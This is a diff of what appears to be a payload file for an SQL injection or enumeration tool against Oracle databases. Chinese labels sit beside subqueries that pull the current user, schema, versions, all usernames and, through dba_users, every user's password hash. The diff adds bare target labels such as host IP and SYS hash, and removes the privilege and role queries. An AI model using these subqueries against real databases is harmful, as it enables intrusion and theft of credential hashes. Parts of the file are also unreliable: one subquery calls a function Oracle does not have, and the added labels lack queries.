@@ -1,10 +1,14 @@
+Base: oracle
 当前用户：(select user from dual)
 当前数据库：(select cur_database() from dual)
-数据库版本：(select banner from v$version where rownum=1)
+-主机名
+-主机IP
+-操作系统用户名
+-SYS用户Hash值
+-数据文件
+-全部用户Hash[dba_users]
+-全部用户Hash[user$]
 全部版本：(select listagg(banner,'; ') within group (order by banner) from v$version)
 全部用户：(select listagg(username,',') within group (order by username) from sys.all_users)
 当前模式：(select sys_context('userenv','current_schema') from dual)
-是否DBA：(select sys_context('userenv','isdba') from dual)
 全部用户Hash：(select listagg(username||':'||password,chr(10)) within group (order by username) from dba_users where password is not null)
-会话权限：(select listagg(privilege,chr(10)) within group (order by privilege) from session_privs)
-会话角色：(select listagg(granted_role,chr(10)) within group (order by granted_role) from session_roles)
